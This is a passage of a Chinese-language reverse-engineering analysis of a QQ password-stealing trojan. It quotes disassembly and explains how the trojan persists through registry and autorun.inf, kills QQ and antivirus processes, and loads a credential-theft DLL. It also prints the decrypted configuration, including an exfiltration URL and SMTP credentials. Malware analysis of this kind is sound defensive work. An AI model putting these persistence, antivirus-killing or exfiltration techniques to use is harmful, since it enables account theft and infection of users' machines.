
> .nsp0:0040AB43 call GetProcAddress
>
> .nsp0:0040AB48 mov esi, eax
>
> .nsp0:0040AB4A call esi ; SetWindowsHookEx
>
> .nsp0:0040AB4C call Reg_Window ; 这里要进去，里面有一时间控件进行实时清除反病毒
>
> .nsp0:0040AB4C ; 软件和实时生成病毒副本
>
> .nsp0:0040AB51 push offset aHookoff ; "HookOff"
>
> .nsp0:0040AB56 push ebx ; hModule
>
> .nsp0:0040AB57 call GetProcAddress
>
> .nsp0:0040AB5C mov esi, eax
>
> .nsp0:0040AB5E call esi ; 关闭 hook,退出程序
>
> .nsp0:0040AB60 push ebx ; hLibModule
>
> .nsp0:0040AB61 call FreeLibrary_0
>
> .nsp0:0040AB66
>
> .nsp0:0040AB66 end_40AB66: ; CODE XREF: start+597 j
>
> .nsp0:0040AB66 xor eax, eax
>
> .nsp0:0040AB68 pop edx
>
> .nsp0:0040AB69 pop ecx
>
> .nsp0:0040AB6A pop ecx
>
> .nsp0:0040AB6B mov fs:[eax], edx
>
> .nsp0:0040AB6E push offset loc_40AB8B
>
> .nsp0:0040AB73
>
> .nsp0:0040AB73 loc_40AB73: ; CODE XREF: .nsp0:0040AB89 j
>
> .nsp0:0040AB73 lea eax, [ebp+var_94]
>
> .nsp0:0040AB79 mov edx, 21h
>
> .nsp0:0040AB7E call @System@@LStrArrayClr$qqrpvi
>
> .nsp0:0040AB83 retn
>
> .nsp0:0040AB83 start endp ; sp = -8Ch

上面的代码基本将病毒所做的事列出来了，这里对上面的代码做个简单文字总结:

病毒运行时先检测病毒是否已经运行，如果已经运行则发送消息使病毒退出。既然病毒已经在内存中为什么病毒还要让自身退出呢，其实原因很简单，这是病毒为了方便自身的升级。

病毒将旧版本的病毒退出内存后病毒删除旧版本病毒中释放的相关文件:"winscok.dll"、"svohost.exe" 并删除以下注册表项:

主键:HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

键值:"sonudmam"

然后清除系统目录下的"qqhx.dat"文件,删除注册表项:

HKLM\software\microsoft\windows\currentversion\run

"tmlurl" = xxx

删除 defghij 盘根目录下的 autorun.inf 文件和 sxs 文件;

生新病毒文件:ergaon.exe、ergaon.dll 以及 qqhx.dat。

然后病毒启动相应的病毒线程执行相应的病毒操作，启动线程后病毒加载主盗号模块"ergaon.dll"实施盗号的罪恶行为。

根据流程图这回到了病毒解密附加数据部分,这部分由于本人并没有该病毒的生成器，因此不敢信口开河，以下是本人分析后的大概情况:

配置木马后病毒将相应的信息进行加密处理，处理完毕后将信息保存在文件尾部，木马运行是进行解密然后将相应的信息保存起来，经过分析得知病毒配置信息大概就是以下样子:

PswQQ_Struct struc ; (sizeof=0x3C)

00000000 pUrl dd ? ; 信息传送网址
00000004 pSmtpServer dd ? ; smtp 服务器地址
00000008 pUserName dd ? ; 用户名
0000000C pMail dd ? ; 邮件地址
00000010 pPWD dd ? ; 连接密码
00000014 pMail_01 dd ? ; email 地址 2，用途未知
00000018 Kill_QQ_flg dd ? ; 终止ＱＱ选项
0000001C pSecond dd ? ; 时间间隔,也就是多少秒后终止ＱＱ进程
00000020 pOption_Infect_Driver dd ? ; 生成 autorun.inf 自动运行选项
00000024 pOption_03 dd ? ; 未知选项
00000028 pOption_04 dd ? ; 未知选项
0000002C pFndWindowName dd ; 需要查找的窗体名
00000030 pOption_05 dd ? ; 未知选项
00000034 pExtFileName dd ? ; 病毒伪装文件名
00000038 pOption_06 dd ? ; 未知选项
0000003C PswQQ_Struct ends

该木马对应的实际信息如下:

PswQQ_Struct struc ; (sizeof=0x3C) $ ==>"http://www.ctv163.com/alexa/Css/heixia.asp"
.nsp0:0040CD28 ; $+4 ASCII "smtp.tom.com"
.nsp0:0040CD28 ; $+8 ASCII "User"
.nsp0:0040CD28 ; $+C ASCII "User@tom.com"
.nsp0:0040CD28 ; $+10 ASCII "123456"
.nsp0:0040CD28 ; $+14 ASCII "xxx@tom.com"
.nsp0:0040CD28 ; $+18 ASCII "yes"
.nsp0:0040CD28 ; $+1C ASCII "60"
.nsp0:0040CD28 ; $+20 ASCII "yes"
.nsp0:0040CD28 ; $+24 ASCII "yes"
.nsp0:0040CD28 ; $+28 ASCII "no"
.nsp0:0040CD28 ; $+2C ASCII "tmlurl"
.nsp0:0040CD28 ; $+30 ASCII "NO"
.nsp0:0040CD28 ; $+34 ASCII "ergaon"
.nsp0:0040CD28 ; $+38 ASCII "no"

看到这些信息聪明的你其实已经可以通这些信息获取到更多的信息甚至追踪到病毒作者:-)。至于你可以追到多少信息就看你自己的了，赶快动动你的大脑，也许你会找到很多很多^\_^。

病毒隐藏自身进程部分由于只能在 win9x 下有效，现在用 win9x 的人已经是很少了吧？因此这里不讲隐藏进程的细节。一句话总结下就是:利用 win9x 特殊 api:RegisterServiceProcess 将自身注册为系统服务进程以实现进程的隐藏。

分析完附加数据部分后下面简单的看看病毒关闭ＱＱ部分:

; DWORD __stdcall Thread_Kill_QQ(LPVOID)
.nsp0:00408B68 Thread_Kill_QQ: ; DATA XREF: start+5B0 o
.nsp0:00408B68 mov eax, Kill_QQ_flg
.nsp0:00408B6D mov eax, [eax]
.nsp0:00408B6F mov edx, offset aYes ; "yes"
.nsp0:00408B74 call @System@@LStrCmp$qqrv ; 判断配置时是否选择了关闭 QQ，如果选择了，
.nsp0:00408B74 ; 则该配置选项为 yes,也就执行关闭ＱＱ操作
.nsp0:00408B79 jnz short locret_408B9D
.nsp0:00408B7B mov eax, pSecond
.nsp0:00408B80 mov eax, [eax]
.nsp0:00408B82 call sub_404C90
.nsp0:00408B87 imul eax, 3E8h
.nsp0:00408B8D push eax
.nsp0:00408B8E call Sleep
.nsp0:00408B93 mov eax, offset aQq_exe ; "QQ.exe"
.nsp0:00408B98 call Kill_Process
.nsp0:00408B9D
.nsp0:00408B9D locret_408B9D: ; CODE XREF: .nsp0:00408B79 j
.nsp0:00408B9D retn
.nsp0:00408B9D ; ---------------------------------------------------------------------------

关闭ＱＱ部分非常简单，我也就不再嗷述了。

接下下我们看看病毒清除反病毒软件部分:

.nsp0:00408BBC ; ================ S U B R O U T I N E ===============================
.nsp0:00408BBC
.nsp0:00408BBC ; 该函数主要是用于清除反病毒软件以及为病毒添加
.nsp0:00408BBC ; 注册表自启动项
.nsp0:00408BBC ; Attributes: bp-based frame
.nsp0:00408BBC
.nsp0:00408BBC ; DWORD __stdcall Thread_Kill_AV(LPVOID)
.nsp0:00408BBC Thread_Kill_AV proc near ; DATA XREF: start+5C8 o
.nsp0:00408BBC
.nsp0:00408BBC var_2C = dword ptr -2Ch
.nsp0:00408BBC var_28 = dword ptr -28h
.nsp0:00408BBC var_24 = dword ptr -24h
.nsp0:00408BBC var_20 = dword ptr -20h
.nsp0:00408BBC var_1C = dword ptr -1Ch
.nsp0:00408BBC var_18 = dword ptr -18h
.nsp0:00408BBC var_14 = dword ptr -14h
.nsp0:00408BBC var_10 = dword ptr -10h
.nsp0:00408BBC var_C = dword ptr -0Ch
.nsp0:00408BBC var_8 = dword ptr -8
.nsp0:00408BBC var_4 = dword ptr -4
.nsp0:00408BBC
.nsp0:00408BBC push ebp
.nsp0:00408BBD mov ebp, esp
.nsp0:00408BBF mov ecx, 5
.nsp0:00408BC4
.nsp0:00408BC4 loc_408BC4: ; CODE XREF: Thread_Kill_AV+D j
.nsp0:00408BC4 push 0
.nsp0:00408BC6 push 0
.nsp0:00408BC8 dec ecx
.nsp0:00408BC9 jnz short loc_408BC4
.nsp0:00408BCB push ecx
.nsp0:00408BCC xor eax, eax
.nsp0:00408BCE push ebp
.nsp0:00408BCF push offset j_@System@@HandleFinally$qqrv_22
.nsp0:00408BD4 push dword ptr fs:[eax]
.nsp0:00408BD7 mov fs:[eax], esp
.nsp0:00408BDA lea edx, [ebp+var_4]
.nsp0:00408BDD mov eax, offset aACnqqcTwqkgdfv ; "ExeMutex_QQRobber2.0"
